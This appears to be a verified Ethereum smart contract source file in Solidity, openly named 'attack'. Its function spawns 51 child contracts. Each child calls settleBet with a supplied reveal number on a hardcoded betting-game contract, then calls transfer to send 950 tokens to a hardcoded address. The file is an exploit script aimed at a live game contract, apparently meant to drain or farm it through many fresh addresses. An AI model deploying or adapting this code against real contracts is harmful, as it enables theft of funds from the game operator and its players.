/**
 *Submitted for verification at Etherscan.io on 2021-06-16
*/

pragma solidity ^0.4.20;

contract calltrade {
    
    function calltrade(uint256 reveal_num)  payable {
        
        // address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;
        address game =  0xeab946f82b5289987ce04408bec9239af512d614;
        game.call(bytes4(keccak256("settleBet(uint256)")),reveal_num);
        game.call(bytes4(keccak256("transfer(address,uint256)")),0xe9c60801c81740abf25884de00f777989c93746e,950);
    }
    
    function () payable{
    }
}

contract attack {
//    address[] private son_list;

    function attack() payable {}

    function attack_starta(uint256 reveal_num) public {
        for(int i=0;i<=50;i++){
           address a = new calltrade(reveal_num);
        }
    }

    function () payable {
    }
}